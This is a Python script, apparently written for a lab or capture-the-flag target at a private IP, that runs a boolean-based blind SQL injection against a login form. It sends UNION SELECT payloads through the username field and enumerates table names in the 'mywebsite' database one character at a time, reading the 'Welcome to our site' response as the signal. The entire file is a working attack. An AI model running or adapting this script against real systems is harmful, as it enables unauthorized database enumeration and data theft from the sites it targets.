import string
import requests
import sys
import time

url = "http://10.10.99.251/index.php"

dbs = ["mywebsite"]

alphabet = string.ascii_lowercase + "-_"

for db in dbs:
    result = ""
    all_results = []
    rotation = 0
    while rotation < len(alphabet):
        i = 0
        while i < len(alphabet):
            char = alphabet[i] if alphabet[i] != '_' else '\_'
            data = {
                "username": f"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = '{db}' AND table_name LIKE BINARY '{result}{char}%'-- -",
                "password": "qsdqsdqsdqsdqsd"
            }
            r = requests.post(url, data=data)
        
            if "Welcome to our site" in r.text:
                result += alphabet[i]
                i = 0
            else:
                print(f"\r{result}{alphabet[i]}", end="", flush=True)
                i += 1
                
            if len(result) == 3 and all_results:
                if [j for j in all_results if j.startswith(result)]:
                    result = ""
                    break
                
        if result:
            if result not in all_results: 
                print(f"\r{result} ")
                all_results.append(result)
            result = ""
            
        # time.sleep(1)
        
        alphabet = alphabet[1:] + alphabet[:1]
        rotation += 1